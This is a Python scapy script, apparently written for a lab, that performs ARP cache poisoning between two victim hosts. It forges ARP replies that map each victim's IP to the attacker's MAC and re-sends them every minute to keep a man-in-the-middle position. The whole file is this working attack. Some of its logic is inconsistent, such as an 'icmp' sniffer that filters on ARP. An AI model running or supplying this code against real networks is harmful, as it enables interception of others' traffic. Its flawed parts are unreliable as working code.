from scapy.all import *
import time
import threading

# icmp to capture
global icmp_packet_global

class ArpPoisoning:
    #initialize the mac and ips of the victims
    def __init__(self, ip_victim1, ip_victim2):
        self.ip_victim1 = ip_victim1
        self.ip_victim2 = ip_victim2

    #find the mac and ip of the current device
    def find_mac_ip(self, packet):
        if packet[0].haslayer(Ether):
            macc = packet[Ether].src
            ipp = packet[ARP].psrc

            return [macc, ipp]

    #sends ping to random address, the destination does not matter
    def send_ping(self):
        icmp_packet = IP() / ICMP()
        icmp_packet[IP].dst = "192.168.56.102"

        send(icmp_packet)

    #create arp package
    def create_pack(self, macAttacker, ipToSpoof, ipVictim):
        arp = Ether() / ARP()
        arp[Ether].src = macAttacker
        arp[ARP].hwsrc = macAttacker
        arp[ARP].psrc = ipToSpoof
        arp[ARP].hwdst = "00:00:00:00:00:00"
        arp[ARP].pdst = ipVictim

        return arp

    #method dedicated to sniffing the icmp package
    def sniff_icmp(self):
        global icmp_packet_global

        pkt = sniff(count=1, filter="arp")
        if len(pkt) > 0:
            icmp_packet_global = pkt[0]

    #refresh arp tables in case victim updates itself
    def maintain_arp_poison(self, arp1, arp2):
        while True:
            sendp(arp1, iface="enp0s3")
            sendp(arp2, iface="enp0s3")
            time.sleep(60)

    def execute_poisoning(self):
        global icmp_packet_global
        #get local variables from class variables
        ip_victim1 = self.ip_victim1
        ip_victim2 = self.ip_victim2

        #create + start thread for sniffing
        thread_sniff = threading.Thread(target=self.sniff_icmp)
        thread_sniff.start()

        #send packet to be sniffed, get the mac of the attacker
        self.send_ping()
        time.sleep(2)
        the_ar = self.find_mac_ip(icmp_packet_global)
        macAttacker = the_ar[0]

        arp1 = self.create_pack(macAttacker, ip_victim1, ip_victim2)
        arp2 = self.create_pack(macAttacker, ip_victim2, ip_victim1)
        thread_arp_poison = threading.Thread(target=self.maintain_arp_poison, args=(arp1, arp2))
        thread_arp_poison.start()
